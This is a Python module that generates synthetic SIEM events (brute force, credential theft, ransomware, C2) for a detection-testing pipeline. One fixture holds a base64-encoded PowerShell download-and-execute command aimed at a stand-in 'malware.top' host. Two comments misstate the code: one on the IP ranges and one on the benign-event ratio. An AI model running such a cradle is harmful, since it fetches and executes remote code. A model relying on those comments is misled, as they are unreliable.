import asyncio
import json
import uuid
import random
import logging
from datetime import datetime, timezone
from typing import Dict, Any, List, Optional
from app.config import settings
from app.streaming.redis_client import get_async_redis, xadd_json

logger = logging.getLogger("aegis.producer")

# Consistent synthetic entities
SYNTHETIC_USERS = ["victim_jdoe", "alice_smith", "admin_corp", "svc_backup", "bob_dev", "operator_sec"]
SYNTHETIC_INTERNAL_HOSTS = ["WS-FIN-04.corp.internal", "SRV-DC01.corp.internal", "WS-ENG-12.corp.internal", "APP-PROD-01.corp.internal", "SRV-FILE-02.corp.internal"]
SYNTHETIC_INTERNAL_IPS = ["10.0.4.15", "10.0.4.1", "10.0.8.22", "10.0.12.50", "192.168.1.105"]
# Documentation IP blocks (RFC 5737: 198.51.100.0/24, 203.0.113.0/24, and known threat test IP)
SYNTHETIC_EXTERNAL_IPS = ["185.220.101.5", "198.51.100.44", "203.0.113.89", "45.33.32.156", "194.26.29.112"]
SYNTHETIC_DOMAINS = ["update-microsoft-cloud.top", "cdn-sysinternals.com", "api.github.com", "login.microsoftonline.com", "data-sync-cloud.org"]

class SyntheticLogProducer:
    """
    Asynchronous continuous security log generator that publishes heterogeneous
    raw events into the 'security:raw' Redis Stream.
    """

    def __init__(self):
        self.is_running = False
        self.rate_eps = 5  # events per second
        self.scenario_mode = "mixed"  # "mixed", "brute_force", "auth_compromise", "endpoint_chain", "c2_outbound", "dlq_test"
        self.total_produced = 0
        self.total_confirmed = 0
        self.total_errors = 0
        self._task: Optional[asyncio.Task] = None
        self._rng = random.Random()
        self.start_time: Optional[datetime] = None
        self.total_target_events: int = 0

    def set_rate(self, rate: Any) -> None:
        """Set events per second rate."""
        try:
            self.rate_eps = max(1, min(int(float(rate)), 100))
        except (ValueError, TypeError):
            self.rate_eps = 5
        logger.info(f"Producer rate updated to {self.rate_eps} EPS")

    @property
    def active_scenario(self) -> str:
        return self.scenario_mode

    @active_scenario.setter
    def active_scenario(self, value: str) -> None:
        self.scenario_mode = value

    @property
    def events_per_second(self) -> int:
        return self.rate_eps

    def configure(self, rate_eps: Optional[int] = None, scenario_mode: Optional[str] = None, seed: Optional[int] = None):
        """Update producer settings dynamically."""
        if rate_eps is not None:
            self.set_rate(rate_eps)
        if scenario_mode is not None:
            self.scenario_mode = scenario_mode
        if seed is not None:
            self._rng.seed(seed)
        logger.info(f"Producer reconfigured: rate={self.rate_eps} EPS, mode={self.scenario_mode}")

    def get_status(self) -> Dict[str, Any]:
        """Returns current operational telemetry and health."""
        uptime = (datetime.now(timezone.utc) - self.start_time).total_seconds() if self.start_time and self.is_running else 0
        return {
            "is_running": self.is_running,
            "rate_eps": self.rate_eps,
            "scenario_mode": self.scenario_mode,
            "total_produced": self.total_produced,
            "total_confirmed": self.total_confirmed,
            "total_errors": self.total_errors,
            "uptime_seconds": round(uptime, 1)
        }

    async def start(self):
        """Start background continuous publishing loop."""
        if self.is_running:
            return
        self.is_running = True
        self.start_time = datetime.now(timezone.utc)
        self._task = asyncio.create_task(self._run_loop())
        logger.info(f"SyntheticLogProducer started at {self.rate_eps} EPS")

    async def stop(self):
        """Gracefully stop publishing loop."""
        self.is_running = False
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
            self._task = None
        logger.info(f"SyntheticLogProducer stopped. Total produced: {self.total_produced}")

    async def _run_loop(self):
        """Main asynchronous event production loop."""
        while self.is_running:
            try:
                # Calculate sleep interval based on target rate
                interval = 1.0 / max(1, self.rate_eps)
                event_data = self._generate_next_event()
                
                # Publish directly to Redis stream 'security:raw'
                await xadd_json(settings.STREAM_RAW, event_data)
                self.total_produced += 1
                self.total_confirmed += 1

                await asyncio.sleep(interval)
            except asyncio.CancelledError:
                break
            except Exception as e:
                self.total_errors += 1
                logger.error(f"Producer error publishing event to Redis: {e}")
                await asyncio.sleep(1.0)

    async def trigger_scenario(self, scenario_name: str, count: int = 5) -> int:
        """
        Burst-publish a controlled multi-event attack sequence for immediate live demonstration.
        Returns the number of events published.
        """
        published = 0
        for _ in range(count):
            event_data = self._generate_scenario_event(scenario_name)
            await xadd_json(settings.STREAM_RAW, event_data)
            self.total_produced += 1
            self.total_confirmed += 1
            published += 1
            await asyncio.sleep(0.05)
        logger.info(f"Triggered demonstration scenario '{scenario_name}': published {published} events")
        return published

    def _generate_next_event(self) -> Dict[str, Any]:
        """Routes event generation according to configured scenario mode."""
        if self.scenario_mode != "mixed":
            return self._generate_scenario_event(self.scenario_mode)

        # In mixed mode: 70% benign, 25% suspicious scenarios, 5% format variations
        roll = self._rng.random()
        if roll < 0.35:
            return self._generate_benign_event()
        elif roll < 0.55:
            return self._generate_scenario_event("brute_force")
        elif roll < 0.70:
            return self._generate_scenario_event("endpoint_chain")
        elif roll < 0.85:
            return self._generate_scenario_event("c2_outbound")
        elif roll < 0.95:
            return self._generate_scenario_event("auth_compromise")
        else:
            return self._generate_dlq_malformed_event()

    def _generate_scenario_event(self, scenario: str) -> Dict[str, Any]:
        """Generates events tailored to specific detection and correlation rules."""
        now_str = datetime.now(timezone.utc).isoformat()
        evt_id = f"synth-{uuid.uuid4()}"

        if scenario == "brute_force":
            # Rule 1 target: Repeated authentication failures for victim_jdoe
            fmt = self._rng.choice(["splunk", "sentinel", "elastic"])
            user = "victim_jdoe"
            src_ip = "198.51.100.44"
            if fmt == "splunk":
                return {
                    "id": evt_id,
                    "siem_source": "Splunk",
                    "format_type": "splunk",
                    "timestamp": now_str,
                    "event_type": "WinEventLog:Security",
                    "EventCode": 4625,
                    "src_ip": src_ip,
                    "dest_ip": "10.0.4.1",
                    "user": user,
                    "alert_name": "An account failed to log on",
                    "severity": "MEDIUM",
                    "status": "failure",
                    "raw_log": f"{now_str} EventCode=4625 User={user} ClientIP={src_ip} Status=0xC000006D LogonType=3"
                }
            elif fmt == "sentinel":
                return {
                    "id": evt_id,
                    "siem_source": "Sentinel",
                    "format_type": "sentinel",
                    "TimeGenerated": now_str,
                    "AlertDisplayName": "Brute Force Authentication Failure",
                    "AlertSeverity": "Medium",
                    "SrcIpAddr": src_ip,
                    "DstIpAddr": "10.0.4.1",
                    "CompromisedEntity": user,
                    "Activity": "FailedLogon",
                    "raw_log": f"Sentinel SecurityAlert: FailedLogon for {user} from {src_ip}"
                }
            else:
                return {
                    "id": evt_id,
                    "siem_source": "Elastic",
                    "format_type": "elastic",
                    "@timestamp": now_str,
                    "event": {"action": "user_login_failed", "severity": 3, "category": "authentication"},
                    "source": {"ip": src_ip, "port": 49152},
                    "destination": {"ip": "10.0.4.1", "port": 88},
                    "user": {"name": user},
                    "raw_log": json.dumps({"event": "user_login_failed", "user": user, "ip": src_ip})
                }

        elif scenario == "auth_compromise":
            # Rule 2 target: Successful authentication following failures
            user = "victim_jdoe"
            src_ip = "198.51.100.44"
            return {
                "id": evt_id,
                "siem_source": "Splunk",
                "format_type": "splunk",
                "timestamp": now_str,
                "event_type": "WinEventLog:Security",
                "EventCode": 4624,
                "src_ip": src_ip,
                "dest_ip": "10.0.4.1",
                "user": user,
                "alert_name": "An account was successfully logged on",
                "severity": "HIGH",
                "status": "success",
                "raw_log": f"{now_str} EventCode=4624 User={user} ClientIP={src_ip} Status=0x0 LogonType=10"
            }

        elif scenario == "endpoint_chain":
            # Rule 3 target: Process creation / mimikatz / powershell on WS-FIN-04
            host = "WS-FIN-04.corp.internal"
            user = "victim_jdoe"
            sub_step = self._rng.choice(["process_spawn", "file_encrypt", "detection_alert"])
            if sub_step == "process_spawn":
                return {
                    "id": evt_id,
                    "siem_source": "Splunk",
                    "format_type": "splunk",
                    "timestamp": now_str,
                    "event_type": "WinEventLog:Sysmon",
                    "ComputerName": host,
                    "user": user,
                    "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBtAGEAbAB3AGEAcgBlAC4AdABvAHAAJwApAA==",
                    "alert_name": "Suspicious Encoded PowerShell Execution",
                    "severity": "HIGH",
                    "src_host": host,
                    "raw_log": f"Sysmon Event 1: Host={host} User={user} Image=powershell.exe"
                }
            elif sub_step == "file_encrypt":
                return {
                    "id": evt_id,
                    "siem_source": "Wazuh",
                    "format_type": "wazuh",
                    "timestamp": now_str,
                    "agent": {"name": host},
                    "src_host": host,
                    "user": user,
                    "file_name": "DECRYPT_NOTES.txt",
                    "rule": {"level": 12, "description": "Rapid creation of encrypted ransom note files"},
                    "data": {
                        "agent": {"name": host},
                        "file": "C:\\Users\\victim_jdoe\\Documents\\DECRYPT_NOTES.txt",
                        "hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
                    },
                    "raw_log": f"Wazuh Alert 12: Host={host} File=DECRYPT_NOTES.txt"
                }
            else:
                return {
                    "id": evt_id,
                    "siem_source": "Elastic",
                    "format_type": "elastic",
                    "@timestamp": now_str,
                    "event": {"action": "lsass_injection_detected", "severity": 4, "category": "endpoint"},
                    "host": {"hostname": host},
                    "src_host": host,
                    "user": {"name": user},
                    "process": {"name": "mimikatz.exe", "hash": {"md5": "44d88612fea8a8f36de82e1278abb02f"}},
                    "rule": {"name": "Mimikatz LSASS Credential Theft Detected"},
                    "raw_log": json.dumps({"action": "lsass_injection", "host": host, "user": user})
                }

        elif scenario == "c2_outbound":
            # Rule 4 target: DNS lookup followed by connection to 185.220.101.5 on port 4444
            dest_ip = "185.220.101.5"
            domain = "update-microsoft-cloud.top"
            return {
                "id": evt_id,
                "siem_source": "QRadar",
                "format_type": "qradar",
                "raw_log": f"LEEF:2.0|IBM|QRadar|7.4|SuspiciousNetworkConnection|severity=8\tsrc=10.0.4.15\tdst={dest_ip}\tsrcPort=51220\tdstPort=4444\tproto=TCP\tdomain={domain}\tbytes_out=2048500\taction=allow"
            }

        elif scenario in ("dlq_test", "malformed"):
            return self._generate_dlq_malformed_event()

        # Fallback benign
        return self._generate_benign_event()

    def _generate_benign_event(self) -> Dict[str, Any]:
        """Generates high-volume benign security telemetry."""
        now_str = datetime.now(timezone.utc).isoformat()
        evt_id = f"benign-{uuid.uuid4()}"
        user = self._rng.choice(SYNTHETIC_USERS)
        host = self._rng.choice(SYNTHETIC_INTERNAL_HOSTS)
        src_ip = self._rng.choice(SYNTHETIC_INTERNAL_IPS)
        fmt = self._rng.choice(["splunk", "elastic", "sentinel"])

        if fmt == "splunk":
            return {
                "id": evt_id,
                "siem_source": "Splunk",
                "format_type": "splunk",
                "timestamp": now_str,
                "event_type": "WinEventLog:Security",
                "EventCode": 4624,
                "src_ip": src_ip,
                "dest_ip": "10.0.4.1",
                "user": user,
                "alert_name": "User Routine Domain Authentication",
                "severity": "INFORMATIONAL",
                "status": "success",
                "raw_log": f"{now_str} EventCode=4624 ComputerName={host} User={user} Status=0x0"
            }
        elif fmt == "sentinel":
            return {
                "id": evt_id,
                "siem_source": "Sentinel",
                "format_type": "sentinel",
                "TimeGenerated": now_str,
                "AlertDisplayName": "Routine Cloud Storage Access",
                "AlertSeverity": "Informational",
                "SrcIpAddr": src_ip,
                "DstIpAddr": "203.0.113.89",
                "CompromisedEntity": user,
                "Activity": "StorageBlobAccess",
                "raw_log": f"Sentinel Audit: User={user} Resource=corp-backup-blob"
            }
        else:
            return {
                "id": evt_id,
                "siem_source": "Elastic",
                "format_type": "elastic",
                "@timestamp": now_str,
                "event": {"action": "dns_query_routine", "severity": 1, "category": "network"},
                "source": {"ip": src_ip, "port": 53421},
                "destination": {"ip": "1.1.1.1", "port": 53},
                "dns": {"question": {"name": "login.microsoftonline.com"}},
                "host": {"hostname": host},
                "user": {"name": user},
                "raw_log": json.dumps({"action": "dns", "domain": "login.microsoftonline.com", "src": src_ip})
            }

    def _generate_dlq_malformed_event(self) -> Dict[str, Any]:
        """Generates deliberately malformed data to verify dead-letter queue (DLQ) processing."""
        evt_id = f"malformed-{uuid.uuid4()}"
        return {
            "id": evt_id,
            "siem_source": "CorruptedFeed",
            "format_type": "unsupported",
            "corrupted_binary_preview": "\x00\x01\xfe\xffINVALID_HEADER",
            "broken_port": "NOT_A_PORT",
            "missing_all_required_keys": True,
            "raw_log": "CORRUPTED_PACKET_CHECKSUM_ERROR_0xDEADBEEF"
        }

# Global singleton producer
synthetic_producer = SyntheticLogProducer()
